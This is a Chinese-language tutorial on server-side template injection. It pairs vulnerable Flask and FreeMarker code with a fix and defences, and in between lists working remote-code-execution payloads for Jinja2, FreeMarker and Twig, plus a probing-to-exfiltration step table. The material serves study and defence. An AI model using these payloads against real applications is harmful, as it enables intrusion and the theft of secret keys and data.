# SSTI（服务端模板注入）

## 什么是 SSTI

SSTI 发生在用户输入被直接嵌入模板引擎时，攻击者可注入模板表达式执行任意代码。

## 常见模板引擎漏洞

### Jinja2（Python）
```python
from flask import render_template_string

# ❌ 漏洞代码
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string(f'<h1>Hello {name}!</h1>')

# ✅ 安全修复
return render_template_string('<h1>Hello {{ name }}!</h1>', name=name)
```

### Jinja2 利用
```jinja
# 基础探测
{{7*7}}  # → 49
{{config}}  # → Flask 配置泄露

# RCE 利用
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# 现代利用
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__['os'].popen('id').read()}}
```

### FreeMarker（Java）
```java
// ❌ 漏洞代码
Template template = configuration.getTemplate("hello.ftl");
template.process(Map.of("userName", request.getParam("name")), out);

// 利用
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Twig（PHP）
```twig
# 利用
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}{{'id'|filter}}
```

## 检测与利用方法

| 步骤 | 动作 | 预期结果 |
|------|------|---------|
| 1. 探测 | 输入 `${7*7}` | 返回 49 |
| 2. 识别引擎 | 输入 `{{7*7}}` | 返回 49 → Jinja2/Twig |
| 3. 读取配置 | `{{config}}` | 泄露 Secret Key |
| 4. RCE | 特定语言 Payload | 执行系统命令 |
| 5. 回连 | 结合 SSRF | 外带数据 |

## 防御措施

1. **永远不要拼接用户输入到模板字符串**
2. 使用沙箱模板环境
3. 限制模板可访问的对象
4. 输入过滤：禁止 `{{` `${` `{%`
5. WAF 规则：检测模板表达式模式
